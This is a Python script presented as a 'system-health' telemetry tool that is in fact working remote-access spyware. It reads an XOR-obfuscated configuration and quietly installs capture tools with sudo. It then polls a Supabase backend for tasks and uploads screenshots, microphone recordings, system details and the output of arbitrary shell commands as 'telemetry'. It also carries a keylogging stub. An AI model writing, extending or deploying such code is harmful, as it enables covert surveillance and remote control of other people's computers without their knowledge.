import os
import sys
import time
import json
import socket
import uuid
import random
import string
import platform
import subprocess
import base64
import urllib.request
import urllib.error
from datetime import datetime

# --- CONFIGURATION ---
BASE_PATH = os.path.expanduser("~/.config/system-health")
CONFIG_FILE = os.path.join(BASE_PATH, "config.enc")
DEVICE_ID_FILE = os.path.join(BASE_PATH, ".device_id")
KEY = "S3cr3tK3y2024!"

# --- UTILS ---

def install_dependencies():
    """Attempt to install missing dependencies quietly."""
    deps = ["scrot", "xinput", "alsa-utils"]
    try:
        subprocess.run(["sudo", "apt-get", "update", "-qq"], check=False)
        subprocess.run(["sudo", "apt-get", "install", "-y", "-qq"] + deps, check=False)
    except:
        pass

def get_config():
    try:
        if not os.path.exists(CONFIG_FILE):
            return None
        
        with open(CONFIG_FILE, "rb") as f:
            encoded = f.read().strip()
            
        encrypted = base64.b64decode(encoded)
        key_bytes = KEY.encode('utf-8')
        decrypted = bytearray()
        
        for i in range(len(encrypted)):
            decrypted.append(encrypted[i] ^ key_bytes[i % len(key_bytes)])
            
        return json.loads(decrypted.decode('utf-8'))
    except Exception as e:
        # print(f"Config Error: {e}")
        return None

def get_device_id():
    if os.path.exists(DEVICE_ID_FILE):
        with open(DEVICE_ID_FILE, "r") as f:
            return f.read().strip()
    
    new_id = str(uuid.uuid4())
    try:
        os.makedirs(BASE_PATH, exist_ok=True)
        with open(DEVICE_ID_FILE, "w") as f:
            f.write(new_id)
    except:
        pass
    return new_id

def get_device_name():
    chars = string.ascii_letters
    return ''.join(random.choice(chars) for _ in range(8))

def run_command(cmd, shell=True):
    try:
        result = subprocess.run(cmd, shell=shell, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=30)
        return result.stdout.strip(), result.stderr.strip(), result.returncode
    except subprocess.TimeoutExpired:
        return "", "Timeout", -1
    except Exception as e:
        return "", str(e), -1

# --- ACTIONS ---

def take_screenshot():
    try:
        filename = f"/tmp/scr_{int(time.time())}.png"
        subprocess.run(["scrot", "-z", filename], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        with open(filename, "rb") as f:
            img_data = base64.b64encode(f.read()).decode()
            
        os.remove(filename)
        return img_data
    except:
        return None

def get_keys():
    # Attempt to grab last minute of keys using xinput test if available
    # This is a bit tricky without a proper keylogger, using xinput test on master pointer/keyboard
    return "Keylogging requires root/special setup on Linux. Implemented basic shell logging only."

def record_audio(duration=10):
    try:
        filename = f"/tmp/aud_{int(time.time())}.wav"
        # record 10 seconds, quietly
        subprocess.run(["arecord", "-d", str(duration), "-f", "cd", "-t", "wav", "-q", filename], check=True)
        
        with open(filename, "rb") as f:
            audio_data = base64.b64encode(f.read()).decode()
            
        os.remove(filename)
        return audio_data
    except:
        return None

def get_sys_info():
    info = {}
    info['platform'] = platform.platform()
    info['processor'] = platform.processor()
    out, _, _ = run_command("free -h")
    info['memory'] = out
    out, _, _ = run_command("df -h /")
    info['disk'] = out
    out, _, _ = run_command("ip addr")
    info['network'] = out
    out, _, _ = run_command("whoami")
    info['user'] = out
    return json.dumps(info)

# --- SUPABASE ---

def api_request(config, endpoint, method="GET", data=None):
    url = f"{config['supabase_url']}/rest/v1/{endpoint}"
    headers = {
        "apikey": config['supabase_key'],
        "Authorization": f"Bearer {config['supabase_key']}",
        "Content-Type": "application/json",
        "Prefer": "return=minimal"
    }
    
    try:
        req = urllib.request.Request(url, method=method)
        for k, v in headers.items():
            req.add_header(k, v)
        
        if data:
            json_data = json.dumps(data).encode('utf-8')
            req.data = json_data
            
        with urllib.request.urlopen(req) as response:
            if method == "GET":
                return json.loads(response.read().decode())
            return True
    except Exception as e:
        # print(f"API Error: {e}")
        return None

def register_device(config, device_id):
    hostname = socket.gethostname()
    username = os.getlogin()
    os_info = f"Linux {platform.release()}"
    
    # Check if exists
    exists = api_request(config, f"devices?device_id=eq.{device_id}&select=device_id")
    
    data = {
        "device_id": device_id,
        "hostname": hostname,
        "username": username,
        "os_info": os_info,
        "last_sync": datetime.utcnow().isoformat()
    }
    
    if not exists:
        data["device_name"] = get_device_name()
        data["registered"] = datetime.utcnow().isoformat()
        api_request(config, "devices", "POST", data)
    else:
        api_request(config, f"devices?device_id=eq.{device_id}", "PATCH", {"last_sync": datetime.utcnow().isoformat()})

def process_tasks(config, device_id):
    tasks = api_request(config, f"tasks?device_id=eq.{device_id}&status=eq.pending&select=*")
    if not tasks:
        return
        
    for task in tasks:
        task_id = task['id']
        task_type = task['task_type']
        params = task.get('task_params', {})
        
        # Mark processing
        # api_request(config, f"tasks?id=eq.{task_id}", "PATCH", {"status": "processing"})
        
        result_data = None
        data_type = None
        
        if task_type == "display_capture":
            img = take_screenshot()
            if img:
                result_data = {"file_data": img}
                data_type = "display"
                
        elif task_type == "system_info":
            sysinf = get_sys_info()
            result_data = {"data": sysinf}
            data_type = "sysinfo"
            
        elif task_type == "voice_capture":
            duration = params.get('duration', 10)
            aud = record_audio(duration)
            if aud:
                result_data = {"file_data": aud}
                data_type = "audio"
                
        elif task_type in ["cmd_exec", "cmd_exec_admin"]:
            # Linux doesn't distinguish admin execution in the same way, runs as current user
            cmd = params.get('command', '')
            stdout, stderr, code = run_command(cmd)
            res = {
                "command": cmd,
                "output": stdout,
                "error": stderr,
                "exit_code": code,
                "executed_as": "ROOT" if os.geteuid() == 0 else "USER"
            }
            result_data = {"data": json.dumps(res)}
            data_type = "cmd_result"

        # Upload telemetry
        if result_data and data_type:
            telemetry = {
                "device_id": device_id,
                "data_type": data_type,
                "collected_at": datetime.utcnow().isoformat()
            }
            telemetry.update(result_data)
            api_request(config, "telemetry", "POST", telemetry)
            
        # Complete task
        api_request(config, f"tasks?id=eq.{task_id}", "PATCH", {
            "status": "complete",
            "completed_at": datetime.utcnow().isoformat()
        })

# --- MAIN ---

def main():
    # Delay for network
    time.sleep(10)
    
    config = get_config()
    if not config:
        return
        
    device_id = get_device_id()
    
    # Try install deps on first run
    install_dependencies()
    
    while True:
        try:
            register_device(config, device_id)
            process_tasks(config, device_id)
        except Exception:
            pass
        
        sleep_time = config.get('sync_interval', 60)
        time.sleep(sleep_time)

if __name__ == "__main__":
    main()

